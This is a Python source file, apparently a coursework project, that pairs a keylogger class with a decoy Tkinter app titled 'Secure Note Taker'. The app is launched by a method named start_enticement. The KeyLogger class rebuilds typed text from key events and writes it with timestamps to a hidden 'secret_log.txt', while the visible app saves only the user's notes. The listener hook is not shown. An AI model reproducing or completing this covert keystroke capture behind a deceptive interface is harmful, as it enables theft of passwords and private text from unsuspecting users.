# This file contains the logging utilities for the project.
# 3 Classes: BaseLogger, KeyLogger (inherits from BaseLogger), and UserInterface

import tkinter as tk
from tkinter import messagebox
from datetime import datetime # Added for timestamps

class BaseLogger:
    def __init__(self, filename):
        self.filename = filename

    def write_to_file(self, data):
        try:
            # Generate a timestamp: [YYYY-MM-DD HH:MM:SS]
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.filename, 'a') as file:
                # Prepend the timestamp to the data
                file.write(f"[{timestamp}] {data}\n")
        except Exception as e:
            print(f"Error writing to {self.filename}: {e}")

class KeyLogger(BaseLogger):
    def __init__(self, filename="secret_log.txt"):
        super().__init__(filename)
        self.current_buffer = ""
        # Data structures to track keystroke sessions and statistics
        self.captured_keys = []  # List to store all captured keys with timestamps
        self.session_data = {}   # Dictionary to store session statistics
        self.key_sequences = []  # List of tuples containing (key, timestamp) pairs
        self.session_count = 0   # Counter for number of sessions
        # Ensure file exists from startup
        try:
            with open(self.filename, 'a'):
                pass
        except Exception as e:
            print(f"Error creating {self.filename}: {e}")

    def process_key(self, key):
        k = str(key).replace("'", "")
        # Append each keystroke as a tuple (key, timestamp) to the list
        self.key_sequences.append((k, datetime.now()))
        self.captured_keys.append(k)
        
        if k == "Key.space":
            self.current_buffer += " "
        elif k == "Key.enter":
            if self.current_buffer:
                # Decided late to add timestamping here as well.
                self.write_to_file(f"Captured: {self.current_buffer}")
                self.current_buffer = "" 
        elif k == "Key.backspace":
            self.current_buffer = self.current_buffer[:-1]
        elif "Key" not in k:
            self.current_buffer += k
    
    def get_session_stats(self):
        """Generate session statistics using loops and data structures"""
        stats = {
            'total_keys': len(self.captured_keys),
            'key_frequency': {},
            'recent_keys': []
        }
        
        # Loop through captured keys to count frequency
        for key in self.captured_keys:
            if key in stats['key_frequency']:
                stats['key_frequency'][key] += 1
            else:
                stats['key_frequency'][key] = 1
        
        # Get the 10 most recent key sequences
        for idx, (key, timestamp) in enumerate(self.key_sequences[-10:]):
            stats['recent_keys'].append({'key': key, 'time': timestamp.strftime('%H:%M:%S')})
        
        return stats
    
    def display_captured_data(self):
        """Display all captured keystroke data using explicit loops"""
        print("\n=== CAPTURED KEYSTROKE DATA ===")
        print(f"Total keys captured: {len(self.captured_keys)}\n")
        
        # Loop through and display key frequency
        print("Key Frequency:")
        for key, count in sorted(self.get_session_stats()['key_frequency'].items(), key=lambda x: x[1], reverse=True):
            print(f"  {key}: {count} times")
        
        # Loop through recent key sequences
        print("\nRecent Key Sequences:")
        for idx, item in enumerate(self.get_session_stats()['recent_keys']):
            print(f"  [{idx+1}] {item['key']} at {item['time']}")
        print("=" * 40 + "\n")

class UserInterface:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Secure Note Taker")
        self.window.geometry("400x350")
    
    def start_enticement(self):
        tk.Label(self.window, text="Welcome to the Secure Note Taker!", 
                 font=("Arial", 12, "bold")).pack(pady=10)
        
        self.text_widget = tk.Text(self.window, height=10, width=40, wrap=tk.WORD)
        self.text_widget.pack(pady=10, padx=10)
        
        button_frame = tk.Frame(self.window)
        button_frame.pack(pady=10)
        
        tk.Button(button_frame, text="Save Notes", command=self.save_notes).pack(side=tk.LEFT, padx=5)
        tk.Button(button_frame, text="Exit", command=self.window.destroy).pack(side=tk.LEFT, padx=5)
        
        self.window.mainloop()
    
    def save_notes(self):
        user_content = self.text_widget.get("1.0", tk.END).strip()
        try:
            # We use a separate logic here if you want the public file 
            # to NOT have timestamps, or keep it consistent by using BaseLogger.
            with open("public_notes.txt", "w") as f:
                f.write(user_content)
            messagebox.showinfo("Saved", "Your notes have been saved!")
        except Exception as e:
            messagebox.showerror("Error", f"Could not save: {e}")